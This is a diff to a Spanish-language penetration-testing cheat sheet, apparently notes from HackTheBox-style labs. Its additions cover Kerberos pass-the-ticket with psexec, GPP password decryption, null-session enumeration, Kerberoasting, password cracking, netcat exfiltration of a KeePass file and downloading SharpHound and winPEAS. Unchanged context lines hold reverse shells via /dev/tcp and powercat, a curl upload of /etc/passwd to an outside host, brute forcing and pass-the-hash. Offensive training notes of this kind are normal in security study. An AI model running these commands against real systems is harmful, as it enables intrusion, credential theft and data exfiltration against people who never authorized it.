@@ -25,7 +25,27 @@ Para poder conectarse a una maquina podemos usar alguno de los siguientes comand
 
 evil-winrm -u USER -p PASS -i IP
 
+## Convvertir ST a kirbi a ccache para psexec
+
+base64 -d ticket.kirbi.b64 > ticket.kirbi
+ticketConverter.py ticket.kirbi ticket.ccache
+KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
+
 # Enumeracion
+
+## GPO
+
+gpp-decrypt GROUPPOLICYPASSWORD
+
+Estos se encuentran en un xml 
+Example -> edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+## RPC
+
+```sh
+rpcclient --user '' --workgroup active.htb --no-pass 10.10.10.100
+crackmapexec wmi 10.10.10.100 -u '' -p ''
+```
 
 ## Nmap
 ```sh
@@ -46,7 +66,9 @@ ldapdomaindump 'ldap://support.htb' -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7Ac
 Si queremos GUI, podemos usar
 
 Apache Directory Studio -> https://directory.apache.org/studio/
-
+```sh
+crackmapexec ldap 10.10.10.100 -u '' -p ''
+```
 ## DNS
 
 ```sh
@@ -374,6 +396,7 @@ sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-
 ```sh
 keepass2john Database.kdbx > keepass.hash 
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+john --wordlist=/usr/share/john/password.lst --rules jeeves.hash 
 ```
 ## Contraseñas de windows
 
@@ -497,10 +520,20 @@ Curl Upload
 curl --upload-file /etc/passwd http://10.10.10.10
 ```
 
+## Pasar archivos de windows a mi maquina
+
+nc.exe -w 3 10.10.14.45 1235 < archivo.kdbx
+nc -lp 1235 > miarchivo.kdbx
+
+
 ## Descargar desde powershell
 ```cmd
 EX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+iwr -uri http://10.10.14.65:8000/SharpHound.exe -Outfile SharpHound.exe
+iwr -uri http://10.10.14.65:8000/winPEASx64.exe -Outfile winPEASx64.exe
+
 ```
+powershell "iwr -uri http://10.10.14.65:8000/SharpHound.exe -Outfile "
 
 ## TFTP
 
@@ -547,6 +580,7 @@ bash -i >& /dev/tcp/10.10.10.10/7777 0>&1
 
 sh -i >& /dev/tcp/10.10.10.10/7777 0>&1
 ```
+
 
 PERL
 
@@ -755,6 +789,18 @@ Otro tool puede ser
 ```sh
 impacket-wmiexec -hashes  00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
 ```
+
+Kerberoasting
+```sh
+Se enumera si es posible connectarse
+
+GetUserSPNs.py domain.htb/USER -dc-ip IP 
+
+Este permite solitiar el ST
+
+GetUserSPNs.py domain.htb/USER -dc-ip IP -request
+```
+
 ## Net-NTLMv2 Relay
 
 La base64 es un rev shell 
@@ -1524,3 +1570,9 @@ source /etc/skel/.bashrc
 
 
 exiftool -a -u brochure.pdf
+
+## NTFS Streams
+
+dir /R
+powershell Get-Content -Path "hm.txt" -Stream "root.txt"
+
